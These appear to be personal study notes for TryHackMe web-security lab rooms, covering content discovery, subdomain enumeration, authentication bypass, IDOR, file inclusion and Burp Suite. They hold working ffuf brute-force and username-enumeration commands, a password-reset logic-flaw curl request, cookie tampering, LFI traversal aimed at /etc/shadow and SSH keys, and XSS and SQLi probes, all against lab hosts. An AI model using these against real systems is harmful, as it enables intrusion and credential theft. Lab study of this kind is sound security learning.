```
## for room.
ctrl+B for subtopic.
```

## Content Discovery
- Wappalyzer (https://www.wappalyzer.com/)
- The Wayback Machine (https://archive.org/web/)
- Automated Discovery https://github.com/danielmiessler/SecLists 
- ffuf,  “Fuzz Faster you Fool” 
- ``` user@machine$ ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://MACHINE_IP/FUZZ ```
- dirb 
- ``` user@machine$ dirb http://MACHINE_IP/ /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt ```
- gobuster
- ``` user@machine$ gobuster dir --url http://MACHINE_IP/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt ```

## Subdomain Enumeration
1. Certificate Transparency (CT) logs
- SSL/TLS Certificates. (https://crt.sh ; https://transparencyreport.google.com/https/certificates)
2. google search ```-site:www.tryhackme.com  site:*.tryhackme.com```
3. ``` dnsrecon -t brt -d acmeitsupport.thm ```
4. ``` ./sublist3r.py -d acmeitsupport.thm ```
5. private DNS server. "/etc/hosts" file (or c:\windows\system32\drivers\etc\hosts file for Windows users) 
6. ``` ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://10.10.123.130 ```
7. ``` ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://10.10.123.130 -fs {size} ``` -fs switch, which tells ffuf to ignore any results that are of the specified size.

## Authentication Bypass
**fuzz posibble exist usernames.**
- https://github.com/ffuf/ffuf
- ``` ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.94.177/customers/signup -mr "username already exists" ```
-  -X argument specifies the request method.
-  -d argument specifies the data that we are going to send.
-  -H argument is used for adding additional headers to the request. setting the "Content-Type" to the webserver knows we are sending form data. 
-  -u argument specifies the URL we are making the request to.
-  -mr argument is the text on the page we are looking for to validate we've found a valid username.

**brute force**
- ``` ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.2.151/customers/login -fc 200 ```
- -fc argument to check for an HTTP status code other than 200.

**logic flaw**
- ``` curl 'http://10.10.2.151/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email={username}@customer.acmeitsupport.thm' ```
- the server send email to the address client posts

**cookie tempering**
- ``` curl -H "Cookie: logged_in=true; admin=true" http://10.10.2.151/cookie-test ```
- Hash crack website. https://crackstation.net/

## IDOR
-  Insecure Direct Object Reference

**find IDOR in Encode IDs**
- https://www.base64decode.org/; https://www.base64encode.org/ 

**find IDOR in Hashed IDs**
- https://crackstation.net/

## File Inclusion

**common OS files:**
- /etc/issue, /etc/profile, /proc/version, /etc/passwd,
- /etc/shadow, /root/.bash_history, /var/log/dmessage,
- /var/mail/root, /root/.ssh/id_rsa, /var/log/apache2/access.log
- C:\boot.ini


**Php include function:**
- https://www.php.net/manual/en/function.include.php


**file-get-contents.php:** 
- https://www.php.net/manual/en/function.file-get-contents.php
- user's input is passed to a function such as file_get_contents in PHP.
-  It's important to note that the function is not the main contributor to the vulnerability. Often poor input validation or filtering is the cause of the vulnerability. 
```php
file_get_contents(
    string $filename,
    bool $use_include_path = false,
    resource $context = ?,
    int $offset = 0,
    int $length = ?
): string|false
```

**Local File Inclusion (LFI)**
```php
<?PHP 
	include("languages/". $_GET['lang']); 
?>
```

Warning: include(languages/../../../../../etc/passwd.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12. Auto add ".php".
- Conquer: ``` include("languages/../../../../../etc/passwd%00").".php"); ``` %00 or 0x00
- NOTE: the %00 trick is fixed and not working with PHP 5.3.4 and above.

**Remote File Inclusion - RFI**
- One requirement for RFI is that the ``` allow_url_fopen ``` option needs to be on.
- ``` allow_url_include ```
- https://www.php.net/manual/en/filesystem.configuration.php#ini.allow-url-fopen
- lead server to execute code from attacker`s server.
- 

## Burp Suite Basic
**Extensions**
- java, jython, jRuby
- https://www.jython.org/
- https://www.jruby.org/
- Burp Suite Extender module: load extension, providing a marketplace.

**Proxy**
- https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-basic/
- Intercept server response. ```Or``` ```Request``` ```Was Intercepted```

**embeded browser**
- ```Project options -> Misc -> Embedded Browser``` and check the ```Allow the embedded browser to run without a sandbox```
- create a new user and run Burp Suite under a low privilege account.(security, recomanded)

**scope**
- after set scope, we need: Proxy Options sub-tab and select ```And``` ```URL``` ```Is in target scope```

**Post modified request**
- URL encode: ctrl+U
```
POST /ticket/ HTTP/1.1
Host: 10.10.117.83
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Origin: http://10.10.117.83
Connection: close
Referer: http://10.10.117.83/ticket/
Upgrade-Insecure-Requests: 1

email=<script>alert("Succ3ssful%2bXSS")</script>&content=hack+test
```
- "%2b" -> "+"

## Brup Suite: Repeater
- Another way: by hand, curl, https://curl.se/
- 0x0d -－"/r"
- 0x0a -－"/n"
- each line of response ends with "/r/n", same as "0d0a".

**SQLi with repeater**
- query ```http://10.10.39.188/about/2'``` with a ```'``` behind.
- 
``` 
<code>Invalid statement: 
    <code>SELECT firstName, lastName, pfpLink, role, bio FROM people WHERE id = 2'</code>
</code>
```
- 
